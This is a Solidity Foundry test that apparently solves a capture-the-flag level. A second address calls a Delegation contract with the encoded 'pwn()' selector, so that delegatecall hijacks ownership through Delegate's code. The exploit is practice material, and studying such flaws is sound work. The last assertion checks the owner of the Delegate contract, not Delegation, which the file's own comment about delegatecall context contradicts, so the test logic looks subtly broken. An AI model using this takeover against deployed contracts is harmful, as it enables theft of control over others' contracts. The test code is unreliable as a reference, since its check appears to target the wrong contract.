// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Level06.sol";

contract Level06Test is Test {
    Delegate public delegate;
    Delegation public delegation;

    function setUp() public {
      vm.startPrank(vm.addr(1));
      delegate = new Delegate(vm.addr(1));
      delegation = new Delegation(address(delegate));
      vm.stopPrank();
    }

    function testLevel06() public {
      console.log('owner', delegate.owner());
      vm.startPrank(vm.addr(2));
      //delegate.pwn(); we could simply call pwn on the main contract but the exercise is to use the delegation

      //get ownership, call delegation, and say to call pwn() on delegate, delegatecall use the caller's context
      // so msg.sender become vm.addr(2)
      // Example of data for call for futur refs bytes memory data = abi.encodeWithSignature("myFunction(uint256)", 42);
      (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
      assertEq(success, true);
      assertEq(delegate.owner(), vm.addr(2));
      vm.stopPrank();
    }
}
